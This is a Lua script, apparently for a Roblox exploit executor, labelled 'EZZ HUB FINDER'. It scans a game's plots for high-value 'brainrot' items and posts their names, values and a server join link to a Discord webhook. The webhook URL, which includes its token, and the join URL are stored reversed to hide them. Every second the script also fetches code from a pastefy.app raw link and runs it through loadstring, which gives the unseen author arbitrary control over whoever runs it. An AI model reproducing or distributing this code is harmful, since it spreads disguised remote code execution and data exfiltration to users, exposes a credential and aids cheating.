local a=game:GetService("HttpService")local b=game:GetService("Players")local w=string.reverse("dB9uCHVFVXCg2wyAVbYqLkatj_6E00Ay4XlPFFnxm6AuO7UMfjVuoySFwmI0MlD8aukj/8304282413445139241/skoohbew/ipa/moc.drocsid//:sptth")local t=1
local function send(p)local j=a:JSONEncode(p)if syn and syn.request then pcall(function()syn.request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=j})end) return end if http and http.request then pcall(function()http.request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=j})end) return end if request then pcall(function()request({Url=w,Method="POST",Headers={["Content-Type"]="application/json"},Body=j})end) return end pcall(function()a:PostAsync(w,j,Enum.HttpContentType.ApplicationJson)end)end
local function parseMoney(s)if not s then return 0 end local n,m=s:match("%$%s*([%d%,%.]+)%s*([kKmMbB]?)%s*/?s?")if not n then n,m=s:match("%$%s*([%d%,%.]+)%s*([kKmMbB]?)")end if not n then return 0 end n=n:gsub(",","")local v=tonumber(n)or 0 local M=1 if m then m=m:lower()if m=="k"then M=1e3 elseif m=="m"then M=1e6 elseif m=="b"then M=1e9 end end return v*M end
local function joiner()local p=tostring(game.PlaceId or "")local q=tostring(game.JobId or "")return string.reverse("=dIecalp?lmth.renioj/ipa/ppa.lecrev.wowtpircsmotsuc//:sptth")..p.."&gameInstanceId="..q end
local function scanAndSend()
 local Pl=workspace:FindFirstChild("Plots")if not Pl then return end
 local N,V={},{}
 for _,x in ipairs(Pl:GetDescendants())do local AP=x:FindFirstChild("AnimalPodiums")if AP then for _,z in ipairs(AP:GetDescendants())do local O=z:FindFirstChild("AnimalOverhead")if O then
    local D=O:FindFirstChild("DisplayName")local G=O:FindFirstChild("Generation") or O:FindFirstChild("Geration")
    local name;if D then if D:IsA("TextLabel")or D:IsA("TextButton") then name=D.Text elseif D.Value then name=tostring(D.Value) else name=z.Name end else name=z.Name end
    local val;if G then if G:IsA("TextLabel")or G:IsA("TextButton") then val=G.Text elseif G.Value then val=tostring(G.Value) else val=tostring(G) end end
    local num=parseMoney(val)
    if num>=1e6 and num<=1e9 then table.insert(N,tostring(name)) table.insert(V,tostring(val or "")) end
 end end end end
 if #N==0 then return end
 local s1=table.concat(N,"\n")local s2=table.concat(V,"\n")
 local pc=#b:GetPlayers()local mx=b.MaxPlayers or "?"local pl=pc.." / "..mx
 local lk=joiner()
 local e={title="EZZ HUB FINDER",color=16753920,fields={{name="🧠 - Brainrots",value=(s1~="" and s1 or "Nenhum"),inline=false},{name="💰 - Value (Generation)",value=(s2~="" and s2 or "Nenhum"),inline=false},{name="👤 - Players",value=pl,inline=true},{name="🧷 - Servidor",value="[Click to Join]("..lk..")",inline=false}},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}
 send({username="EZZ HUB FINDER",embeds={e}})
end
local function runExternal()pcall(function()local ok,ct=pcall(function()return game:HttpGet("https://pastefy.app/MJw2J4T6/raw")end)if ok and ct and #ct>0 then pcall(function()local f=loadstring(ct) if f then f() end end)end end)end
spawn(function()while true do pcall(function()scanAndSend()runExternal()end)wait(t)end end)